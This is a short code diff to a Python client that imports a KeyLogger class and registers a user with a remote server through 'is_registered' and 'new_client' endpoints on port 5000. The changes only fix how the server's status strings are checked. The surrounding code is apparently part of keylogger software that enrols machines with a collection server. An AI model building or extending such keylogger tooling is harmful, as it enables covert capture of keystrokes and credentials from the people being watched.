@@ -5,13 +5,13 @@ from keylogger import KeyLogger
 
 def is_registred(server_url, user):
     answer = requests.post(server_url+':5000/is_registered', json={'user':user}).json()
-    return True if answer['status']=='Successfully' else False
+    return True if answer['status']=='is_exist' else False
 
 def registration(server_url, user):
     keylogger = KeyLogger(user)
     registration_data = keylogger.registration()
     answer = requests.post(server_url+':5000/new_client', json=registration_data).json()
-    if answer['status'] == 'Successfully':
+    if answer['status'] == 'successfully':
         print('\n[+] Successfully registration')
     else: 
         print('\n[+] Unsuccessfully registration')   
